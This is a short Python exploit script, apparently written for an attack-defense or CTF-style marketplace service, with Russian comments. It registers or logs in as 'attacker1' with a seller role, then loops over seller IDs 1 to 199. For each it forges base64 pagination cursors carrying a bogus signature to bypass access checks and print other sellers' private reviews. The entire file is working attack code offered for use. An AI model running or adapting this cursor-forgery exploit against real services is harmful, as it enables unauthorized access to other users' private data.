import base64, json, requests, sys

BASE = "http://213.171.25.86:8090"
USERNAME = "attacker1"
PASSWORD = "attackerpass1"

s = requests.Session()

# 1. пробуем логин, если нет - регаем seller
r = s.post(f"{BASE}/api/login", json={"username": USERNAME, "password": PASSWORD})
if r.status_code != 200:
    print(f"login {r.status_code} {r.text[:200]} -> register")
    r = s.post(f"{BASE}/api/register", json={
        "username": USERNAME, "password": PASSWORD, "role": "seller",
        "company_name": "OOO Test", "tax_id": "1234567890", "signature": "test"
    })
    print(f"register {r.status_code} {r.text[:200]}")
    if r.status_code not in (200, 201):
        sys.exit(1)
    r = s.post(f"{BASE}/api/login", json={"username": USERNAME, "password": PASSWORD})
    print(f"login2 {r.status_code} {r.text[:200]}")

# проверка что мы seller и залогинены
r = s.get(f"{BASE}/api/me")
print(f"me {r.status_code} {r.text[:300]}")
if r.status_code != 200:
    sys.exit(1)


def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


for victim_id in range(1, 200):
    payload = json.dumps(
        {"seller_id": victim_id, "is_private": True, "last_id": 1000000000, "v": 2},
        separators=(",", ":")
    ).encode()
    forged = b64e(payload) + ".deadbeefdeadbeef"
    r = s.get(f"{BASE}/api/seller/reviews", params={"cursor": forged, "limit": 3})

    if r.status_code != 200:
        print(f"victim {victim_id}: {r.status_code} {r.text[:120]}")
        continue

    data = r.json()
    reviews = data.get("reviews", [])

    if reviews:
        print(f"victim {victim_id}: HIT {len(reviews)}")
        for rev in reviews:
            print(f"  {rev.get('body')}")
    else:
        # выводим все пустые ответы, а не только каждую 20-ю
        print(f"victim {victim_id}: empty")
